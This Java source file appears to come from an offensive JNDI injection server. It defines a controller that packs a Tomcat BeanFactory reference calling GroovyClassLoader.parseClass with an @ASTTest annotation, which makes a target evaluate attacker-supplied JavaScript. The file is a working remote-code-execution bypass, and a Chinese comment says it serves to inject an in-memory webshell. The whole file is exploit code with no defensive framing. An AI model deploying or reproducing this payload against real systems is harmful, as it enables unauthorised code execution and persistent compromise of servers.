package cn.butler.jndi.controller.bypass;

import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.jndi.controller.BasicController;
import cn.butler.thirdparty.payloads.expression.JSExpression;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/GroovyClassLoader")
public class GroovyClassLoaderController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        //Groovy下调用JS代码注内存马有些问题，所以这里没有直接复用JSExpression下的commonExpressModify代码,用unsafeExpressModify,原因后面详细研究
        String code = JSExpression.unsafeExpressModify(byteCode).replace(";", "\\;");

        String script = "@groovy.transform.ASTTest(value={" +
                "    assert Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")" +
                "})\n" +
                "class Person {" +
                "}";
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        ref.add(new StringRefAddr("x", script));
        return ref;
    }
}
